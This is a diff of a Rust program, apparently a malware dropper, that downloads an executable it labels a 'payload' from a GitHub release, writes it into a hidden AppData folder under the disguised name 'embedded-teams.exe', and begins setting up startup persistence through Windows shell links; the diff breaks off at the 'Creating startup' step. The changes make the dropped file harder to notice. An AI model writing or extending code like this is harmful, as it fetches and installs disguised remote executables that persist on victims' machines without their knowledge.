@@ -1,11 +1,11 @@
-use std::fs;
+use std::{fs, os};
 
 use windows::{core::{Interface, PCWSTR, PWSTR}, Win32::{System::Com::{CoCreateInstance, CoInitializeEx, IPersistFile, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED}, UI::Shell::{IShellLinkW, ShellLink}}};
 
 #[tokio::main]
 async fn main() {
     println!("Fetching payload...");
-    let download_url = "https://github.com/ctih1/chatgpt-export-analyzer/releases/download/2025-07-24-15-02/chatgpt-analyzer.exe";
+    let download_url = "https://github.com/ctih1/kake/releases/download/latest/updater.exe";
 
     let resp = reqwest::get(download_url).await.expect("failed to download payload");
     let body = resp.bytes().await.expect("Invalid payload");
@@ -13,10 +13,14 @@ async fn main() {
     let username = std::env::var("USERNAME").unwrap();
 
     println!("Saving payload");
-    let path = format!("C:\\Users\\{username}\\desktop\\out.exe");
+    let base_path = format!("C:\\Users\\{username}\\AppData\\mun-gradia");
+    if let Err(e) = fs::create_dir_all(&base_path) {
+        println!("Failed to create dirs. {e}");
+    }
+
+    let path = format!("{base_path}\\embedded-teams.exe");
     if let Err(e) = fs::write(&path, body) {
         println!("failed to write payload: {}", e);
-    
     }
 
     println!("Creating startup");
